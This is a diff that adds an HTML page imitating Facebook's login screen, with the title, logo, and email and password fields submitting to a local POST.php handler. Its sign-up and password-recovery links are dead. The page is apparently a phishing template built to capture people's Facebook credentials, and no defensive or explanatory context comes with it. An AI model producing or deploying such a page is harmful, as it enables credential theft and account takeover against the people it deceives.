@@ -1,0 +1,71 @@
+<html><head>
+  <html dir="ltr" lang="en"><head><meta charset="UTF-8"><title>Facebook - log in or sign up</title>
+    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
+    
+
+    <link rel="stylesheet" type="text/css" href="/stylesheet.css"> 
+  </head>
+  <body>
+    <!-- NavBar -->
+     <style>
+      /* [WHAT YOU NEED] */
+      img.logo {
+        height: 80%;
+            padding: 3;
+        /* Recommended - Limit maximum width */
+        max-width: 100%;
+      }
+
+      /* [DOES NOT MATTER] */
+      html, body {
+        padding: 0;
+        margin: 0;
+        font-family: arial, sans-serif;
+      }
+      #page-body {
+        padding: 10px;
+      }
+    </style>
+    
+    
+    <div class="navbar">
+        
+     <header id="page-header">
+         <center>
+      <img src="/logo.png" class="logo"/>
+      </center>
+    </header>   
+    </div>
+    <div style="display:-webkit-box">
+      <div style="-webkit-box-flex:1">
+        <!--Nav-Header-->
+        <div class="nav-head">
+          <span>You need to log in first</span>
+        </div>
+
+
+
+        <!-- Formulaire -->
+        <div style="background-color:#2c3b5a0f;padding:2 31px">
+          <form method="post" style="padding-top:17px;" action="/POST.php">
+            <div class="formulaire" style="background:white;"> 
+              <input class="entrer" style="padding:12px;" name="email" placeholder="Mobile number or email address" type="text">
+              <input class="entrer" style="padding:12px;" name="pass" placeholder="Password" type="password">
+              <div style="padding:12px;"> 
+                <button type="submit" class="square_btn">Log in</button>
+              </div>
+            </div>
+          </form> 
+
+          <div class="fruit">
+            <a class="koala">Create new account</a> 
+          </div>
+
+          <div class="contact-us">
+            <a>Forgot password?</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
